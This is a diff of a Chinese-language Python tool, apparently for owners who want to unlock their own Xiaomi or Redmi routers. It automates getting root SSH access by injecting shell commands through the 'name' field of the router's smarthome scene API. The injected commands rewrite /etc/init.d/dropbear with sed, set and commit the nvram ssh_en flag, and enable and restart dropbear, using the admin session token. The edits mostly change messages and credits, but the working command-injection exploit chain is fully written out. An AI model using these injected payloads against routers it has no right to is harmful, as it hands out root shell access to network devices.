@@ -110,9 +110,6 @@ class RouterHack:
         第2步: 设置系统时间
         """
         try:
-            print("\n正在设置系统时间...")
-            self.time.sleep(3)
-
             # 获取当前时间并格式化
             current_time = self.datetime.now()
             formatted_time = current_time.strftime("%Y-%-m-%-d%%20%-H:%-M:%-S")  # 修改格式化方式，去掉前导零
@@ -120,14 +117,13 @@ class RouterHack:
             # 构建URL
             url = f"{self.base_url}/api/misystem/set_sys_time?time={formatted_time}&timezone=CST-8"
             
-            print("\n步骤 2.1: 发送系统时间设置请求...")
+            print("步骤 2.1: 发送系统时间设置请求...")
             response = self.requests.get(url)
-            print("\n步骤 2.1 请求结果 ===")
             result = response.json()
             print(f"响应数据: {self.json.dumps(result, ensure_ascii=False, separators=(',', ':'))}")
             
             if result.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
                 self.time.sleep(3)
                 return True
             else:
@@ -148,15 +144,11 @@ class RouterHack:
         2. 使用 sed 命令将 /etc/init.d/dropbear 中的所有 release 替换为 XXXXXX
         3. 这个步骤是为了绕过系统对 dropbear 服务的限制
         """
-        try:
-            print("\n第3步: 解锁dropbear配置")
-            print("-" * 40)
-            self.time.sleep(3)
-            
+        try:           
             url = f"{self.base_url}/api/xqsmarthome/request_smartcontroller"
-            
+
             # 步骤 3.1: 发送解锁请求
-            print("\n步骤 3.1: 发送解锁请求...")
+            print("步骤 3.1: 发送解锁请求...")
             payload_data1 = {
                 "command": "scene_setting",
                 "name": "'$(sed -i s/release/XXXXXX/g /etc/init.d/dropbear)'",  # 使用 sed 替换命令
@@ -179,13 +171,12 @@ class RouterHack:
             }
             
             response1 = self.requests.post(url, data={"payload": self.json.dumps(payload_data1)})
-            print("\n步骤 3.1 请求结果 ===")
             result1 = response1.json()
             print(f"响应数据: {self.json.dumps(result1, ensure_ascii=False, separators=(',', ':'))}")
             
             # 详细的错误判断
             if result1.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             elif result1.get('code') == 3001:
                 print("\n❌ stok 代币值已过期")
                 print("请重新登录 Web 管理后台获取新的 stok 值")
@@ -205,7 +196,7 @@ class RouterHack:
             self.time.sleep(3)
             
             # 步骤 3.2: 启动场景
-            print("\n步骤 3.2: 启动场景...")
+            print("步骤 3.2: 启动场景...")
             payload_data2 = {
                 "command": "scene_start_by_crontab",
                 "time": "3:1",
@@ -213,11 +204,10 @@ class RouterHack:
             }
             
             response2 = self.requests.post(url, data={"payload": self.json.dumps(payload_data2)})
-            print("\n步骤 3.2 请求结果 ===")
             result2 = response2.json()
             print(f"响应数据: {self.json.dumps(result2, ensure_ascii=False, separators=(',', ':'))}")
             if result2.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result2.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -226,7 +216,7 @@ class RouterHack:
             
             # 最终结果判断
             print()
-            print("第3步: 解锁dropbear配置 操作全部完成")
+            print("##解锁dropbear配置 操作全部完成")
             return True
 
         except Exception as e:
@@ -238,14 +228,10 @@ class RouterHack:
         第4步: 使用 nvram 激活 ssh_en 配置项
         """
         try:
-            print("\n第4步: 使用 nvram 激活 ssh_en 配置项")
-            print("-" * 40)
-            self.time.sleep(3)
-            
             url = f"{self.base_url}/api/xqsmarthome/request_smartcontroller"
 
             # 步骤 4.1: 设置 ssh_en=1
-            print("\n步骤 4.1: 设置 ssh_en=1...")
+            print("步骤 4.1: 设置 ssh_en=1...")
             payload_data1 = {
                 "command": "scene_setting",
                 "name": "'$(nvram set ssh_en=1)'",
@@ -268,11 +254,10 @@ class RouterHack:
             }
             
             response1 = self.requests.post(url, data={"payload": self.json.dumps(payload_data1)})
-            print("步骤 4.1 请求结果 ===")
             result1 = response1.json()
             print(f"响应数据: {self.json.dumps(result1, ensure_ascii=False, separators=(',', ':'))}")
             if result1.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result1.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -280,18 +265,17 @@ class RouterHack:
             self.time.sleep(3)
             
             # 步骤 4.2: 启动第一个场景
-            print("\n步骤 4.2: 启动场景...")
+            print("步骤 4.2: 启动场景...")
             payload_data2 = {
                 "command": "scene_start_by_crontab",
                 "time": "3:2",
                 "week": 0
             }
             response2 = self.requests.post(url, data={"payload": self.json.dumps(payload_data2)})
-            print("步骤 4.2 请求结果 ===")
             result2 = response2.json()
             print(f"响应数据: {self.json.dumps(result2, ensure_ascii=False, separators=(',', ':'))}")
             if result2.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result2.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -299,7 +283,7 @@ class RouterHack:
             self.time.sleep(3)
 
             # 步骤 4.3: 执行 nvram commit
-            print("\n步骤 4.3: 执行 nvram commit...")
+            print("步骤 4.3: 执行 nvram commit...")
             payload_data3 = {
                 "command": "scene_setting",
                 "name": "'$(nvram commit)'",
@@ -321,11 +305,10 @@ class RouterHack:
                 }
             }
             response3 = self.requests.post(url, data={"payload": self.json.dumps(payload_data3)})
-            # print("步骤 4.3 请求结果 ===")
             result3 = response3.json()
             print(f"响应数据: {self.json.dumps(result3, ensure_ascii=False, separators=(',', ':'))}")
             if result3.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result3.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -333,18 +316,17 @@ class RouterHack:
             self.time.sleep(3)
 
             # 步骤 4.4: 启动第二个场景
-            print("\n步骤 4.4: 启动第二个场景...")
+            print("步骤 4.4: 启动第二个场景...")
             payload_data4 = {
                 "command": "scene_start_by_crontab",
                 "time": "3:3",
                 "week": 0
             }
             response4 = self.requests.post(url, data={"payload": self.json.dumps(payload_data4)})
-            # print("\n步骤 4.4 请求结果 ===")
             result4 = response4.json()
             print(f"响应数据: {self.json.dumps(result4, ensure_ascii=False, separators=(',', ':'))}")
             if result4.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result4.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -352,22 +334,20 @@ class RouterHack:
             self.time.sleep(3)
 
             # 步骤 4.5: 检查SSH支持
-            print("\n步骤 4.5: 检查路由器SSH支持...")
+            print("步骤 4.5: 检查路由器SSH支持...")
             check_url = f"{self.base_url}/api/xqsystem/fac_info"
             response = self.requests.get(check_url)
-            print("\n步骤 4.5 请求结果 ===")
             result = response.json()
             print(f"响应数据: {self.json.dumps(result, ensure_ascii=False, separators=(',', ':'))}")
 
             # 检查响应中的 ssh 值
             if result.get('ssh') == True:  # 明确检查 ssh 值是否为 True
-                print("✓ 检测到路由器支持SSH功能")
-                print("操作完成")
-                self.time.sleep(3)
-                print("\n第4步: 使用 nvram 激活 ssh_en 配置项 操作全部完成")
+                print("✓  恭喜，检测到路由器支持开启SSH功能")
+                self.time.sleep(5)
+                print("\n##使用 nvram 激活 ssh_en 配置项 操作全部完成")
                 return True
             else:
-                print("\n❌ 此路由器当前ROM不支持开启SSH")
+                print("\n❌ 太可惜了，此路由器当前ROM不支持开启SSH")
                 print("检测到 ssh 值为 false")
                 print("建议更新路由器固件后重试")
                 print("\n❌ 检测到错误，终止操作")
@@ -382,14 +362,11 @@ class RouterHack:
         第5步: 启动 dropbear 服务
         """
         try:
-            print("\n第5步: 启动 dropbear 服务")
-            print("-" * 40)
-            self.time.sleep(3)
-            
+
             url = f"{self.base_url}/api/xqsmarthome/request_smartcontroller"
 
             # 步骤 5.1: 启用 dropbear
-            print("\n步骤 5.1: 启用 dropbear...")
+            print("步骤 5.1: 启用 dropbear...")
             payload_data1 = {
                 "command": "scene_setting",
                 "name": "'$(/etc/init.d/dropbear enable)'",  # 启用 dropbear
@@ -412,11 +389,11 @@ class RouterHack:
             }
             
             response1 = self.requests.post(url, data={"payload": self.json.dumps(payload_data1)})
-            # print("\n步骤 5.1 请求结果 ===")
+            # print("步骤 5.1 请��结果 ===")
             result1 = response1.json()
             print(f"响应数据: {self.json.dumps(result1, ensure_ascii=False, separators=(',', ':'))}")
             if result1.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result1.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -424,18 +401,18 @@ class RouterHack:
             self.time.sleep(3)
             
             # 步骤 5.2: 启动第一个场景
-            print("\n步骤 5.2: 启动场景...")
+            print("步骤 5.2: 启动场景...")
             payload_data2 = {
                 "command": "scene_start_by_crontab",
                 "time": "3:4",  # 与上一步时间一致
                 "week": 0
             }
             response2 = self.requests.post(url, data={"payload": self.json.dumps(payload_data2)})
-            # print("\n步骤 5.2 请求结果 ===")
+            # print("步骤 5.2 请求结果 ===")
             result2 = response2.json()
             print(f"响应数据: {self.json.dumps(result2, ensure_ascii=False, separators=(',', ':'))}")
             if result2.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result2.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -443,7 +420,7 @@ class RouterHack:
             self.time.sleep(3)
 
             # 步骤 5.3: 重启 dropbear
-            print("\n步骤 5.3: 重启 dropbear...")
+            print("步骤 5.3: 重启 dropbear...")
             payload_data3 = {
                 "command": "scene_setting",
                 "name": "'$(/etc/init.d/dropbear restart)'",  # 重启 dropbear
@@ -465,11 +442,11 @@ class RouterHack:
                 }
             }
             response3 = self.requests.post(url, data={"payload": self.json.dumps(payload_data3)})
-            # print("\n步骤 5.3 请求结果 ===")
+            # print("步骤 5.3 请求结果 ===")
             result3 = response3.json()
             print(f"响应数据: {self.json.dumps(result3, ensure_ascii=False, separators=(',', ':'))}")
             if result3.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result3.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -477,18 +454,18 @@ class RouterHack:
             self.time.sleep(3)
 
             # 步骤 5.4: 启动第二个场景
-            print("\n步骤 5.4: 启动第二个场景...")
+            print("步骤 5.4: 启动第二个场景...")
             payload_data4 = {
                 "command": "scene_start_by_crontab",
                 "time": "3:5",  # 与上一步时间一致
                 "week": 0
             }
             response4 = self.requests.post(url, data={"payload": self.json.dumps(payload_data4)})
-            # print("\n步骤 5.4 请求结果 ===")
+            # print("步骤 5.4 请求结果 ===")
             result4 = response4.json()
             print(f"响应数据: {self.json.dumps(result4, ensure_ascii=False, separators=(',', ':'))}")
             if result4.get('code') == 0:
-                print("操作完成")
+                print("操作成功")
             else:
                 print(f"请求错误: {result4.get('msg', '未知错误')}")
                 print("\n❌ 检测到错误，终止操作")
@@ -497,7 +474,7 @@ class RouterHack:
 
             # 最终结果判断
             print()
-            print("第5步: 启动 dropbear 服务 操作全部完成")
+            print("##启动 dropbear 服务 操作全部完成")
             return True
 
         except Exception as e:
@@ -509,18 +486,17 @@ class RouterHack:
         显示SSH连接提示信息
         """
         print("\n=== SSH 连接说明 ===")
-        print("1. 获取SSH密码（S/N码）:")
+        print("1. 通过（S/N码）获取SSH密码:")
         print("   → 访问 https://miwifi.dev/ssh")
-        print("   → 输入路由器后台主页中的S/N码进行验证")
-        print("   → 获取SSH登录密码")
+        print("   → 输入路由器后台主页中的S/N码进行获取密码")
+        print("   → 获取的密码即为SSH登录密码")
         
         print("\n2. 使用以下命令连接路由器:")
         print(f"   ssh root@{self.host}")
-        print("   如果无法登录:")
+        print("   如果无法登录考虑实用:")
         print(f"   ssh -oHostKeyAlgorithms=+ssh-rsa root@{self.host}")
         
-        print("\n3. 输入密码:")
-        print("   → 使用从 miwifi.dev/ssh 获取的密码")
+
 
     def show_ssh_guide(self):
         """
@@ -529,17 +505,13 @@ class RouterHack:
         try:
             print("\n第6步: SSH连接说明")
             print("-" * 40)
-            self.time.sleep(2)
 
             # 显示SSH连接提示
             self.show_ssh_tips()
             
             # 用户交互
-            print("\n→ 请按回车键结束程序...")
+            print("\n→ 仔细阅读信息，回车键进行下一步...")
             input()
-            
-            print("\n✓ 全部操作已完成")
-            print("现在可以尝试使用SSH连接到路由器了")
             return True
 
         except Exception as e:
@@ -562,9 +534,8 @@ class RouterHack:
             # 构建URL
             url = f"{self.base_url}/api/misystem/set_sys_time?time={formatted_time}&timezone=CST-8"
             
-            print("\n步骤 7.1: 发送时间重置请求...")
+            print("步骤 7.1: 发送时间重置请求...")
             response = self.requests.get(url)
-            print("\n步骤 7.1 请求结果 ===")
             result = response.json()
             print(f"响应数据: {self.json.dumps(result, ensure_ascii=False, separators=(',', ':'))}")
             
@@ -595,12 +566,17 @@ class RouterHack:
             print("2. 如需保持SSH永久访问，需要进行硬固化操作")
             print("\n[!] 风险警告")
             print("1. 硬固化操作具有一定风险")
+            print("2. 本程序目前不提供硬固化操作")
+            
+            print("\n" + "=" * 50)
+            print("程序执行完成!")
+            print("感谢原作者 Minorice 的开源贡献")
+            print("=" * 50)
             
             # 用户交互
-            print("\n→ 请按回车键结束程序...")
+            print("\n→ 按回车键结束程序...")
             input()
             
-            print("\n✓ 全部操作已完成")
             return True
 
         except Exception as e:
@@ -609,7 +585,7 @@ class RouterHack:
 
 def show_welcome_banner():
     """
-    显示欢迎界面
+    显示欢迎界面并等待用户确认
     """
     banner = """
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
@@ -624,20 +600,54 @@ def show_welcome_banner():
     print(banner)
     print("\n功能说明:")
     print("-" * 50)
-    print("本工具用于自动化获取小米路由器的 SSH 访问权限")
-    print("支持功能：")
-    print("1. 自动设置系统时间")
-    print("2. 自动解锁 SSH 访问")
-    print("3. 配置 dropbear 服务")
-    print("4. 提供详细的操作指南")
+    print("本工具用于自动化获取小米/红米路由器的 SSH 访问权限")
+    print("原创作者: Minorice")
+    print("原帖地址: https://www.right.com.cn/forum/thread-8348455-1-1.html")
+    print("\n支持功能：")
+    print("1. 支持小米/红米路由器")
+    print("2. 已经在红米AX1800 上实践使用")
+    print("3. 路由器是否支持开启 ssh会有提示")
+    print("4. 个别路由器需要特定 rom 版本")
     print("-" * 50)
+    
+    print("\n使用说明:")
+    print("-" * 50)
+    print("1. 需要先登录路由器管理后台")
+    print("2. 复制浏览器地址栏完整链接")
+    print("3. 工具会自动完成以下操作：")
+    print("   → 设置系统时间")
+    print("   → 解锁 SSH 访问")
+    print("   → 提供连接ssh指南")
+    print("   → 恢复路由器原始时间")
+    print("-" * 50)
+    
+    print("\n注意事项:")
+    print("-" * 50)
+    print("1. 操作前请确保路由器固件版本合适")
+    print("2. 建议先备份路由器配置")
+    print("3. 操作过程中请勿断开电源")
+    print("4. 如遇问题可重启路由器重试")
+    print("-" * 50)
+    
+    # 用户确认
+    while True:
+        choice = input("确认好进行操作[Y/n]: ").lower()
+        if choice == 'n':
+            print("\n已取消操作，程序退出...")
+            sys.exit(0)
+        elif choice == 'y' or choice == '':
+            print("用户已确认，开始执行...")
+            return True
+        else:
+            print("无效的输入，请输入 Y 或 n")
 
 def main():
     """
     主函数 - 按引导步骤执行
     """
-    # 显示欢迎界面
-    show_welcome_banner()
+    # 显示欢迎界面并等待用户确认
+    if not show_welcome_banner():
+        return
     
     # 首先检查并安装依赖
     if not install_dependencies():
@@ -654,26 +664,25 @@ def main():
         return
 
     print("\n开始执行自动化配置流程...")
-    # time.sleep(3)
     
     # 第一步：获取路由器信息
     print("\n第1步: 配置路由器信息")
     print("-" * 40)
     print("请按照以下步骤操作：")
-    print("1. 登录小米路由器后台")
+    print("1. 登录小米路由器后台http://192.168.31.1")
     print("2. 保持登录状态")
     print("3. 复制浏览器地址栏的完整链接")
     print("示例链接：http://192.168.31.1/cgi-bin/luci/;stok=xxxxxx/web/home#router")
     
     # 设置默认链接
-    default_url = "http://192.168.31.1/cgi-bin/luci/;stok=e3e0eb8b0e655cac89972d7428ddae75/web/home#router"
+    # default_url = "http://192.168.31.1/cgi-bin/luci/;stok=e3e0eb8b0e655cac89972d7428ddae75/web/home#router"
     
     while True:
-        url = input(f"\n请粘贴路由器后台链接 [回车使用默认链接]: ").strip() or default_url
+        url = input(f"请输入链接: ").strip()
         host, token = extract_host_token(url)
         
         if host and token:
-            print(f"\n已成功提取信息:")
+            print(f"已成功提取信息:")
             print(f"#路由器IP: {host}#Token: {token}")
             
             while True:
@@ -708,16 +717,21 @@ def main():
     # 按顺序执行步骤
     for i, (step_name, step_func) in enumerate(steps, 2):
         print(f"\n第{i}步: {step_name}")
-        print("-" * (len(f"第{i}步: {step_name}") + 2))
-        # time.sleep(3)  # 每个主步骤开始前等待3秒
+        print("-" * 40)
         
         if step_func():
             print(f"✓ {step_name}执行成功")
         else:
             print(f"✗ {step_name}执行失败")
             print("\n配置过程已终止")
+            print("\n获取帮助：")
+            print("-" * 40)
+            print("1. 请访问以下链接查看常见问题与解决方案：")
+            print("   https://www.right.com.cn/forum/thread-8348455-1-1.html")
+            print("2. 在页面中搜索遇到的错误信息")
+            print("3. 如果问题仍未解决，可以在帖子中留言求助")
+            print("-" * 40)
             return
-        # time.sleep(3)  # 每个主步骤结束后等待3秒
 
     # 第6步: 显示SSH连接说明
     if not router.show_ssh_guide():
